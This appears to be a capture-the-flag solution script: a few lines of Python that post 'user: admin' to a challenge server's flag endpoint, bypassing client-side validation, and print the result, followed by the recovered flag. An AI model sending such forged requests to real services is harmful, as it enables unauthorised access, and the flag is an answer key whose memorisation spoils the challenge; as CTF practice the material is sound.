import requests

data = {
	"user":"admin"
}
res = requests.post("https://flag-viewer.mc.ax/flag",data=data)
print(res.text)

## hope{oops_client_side_validation_again}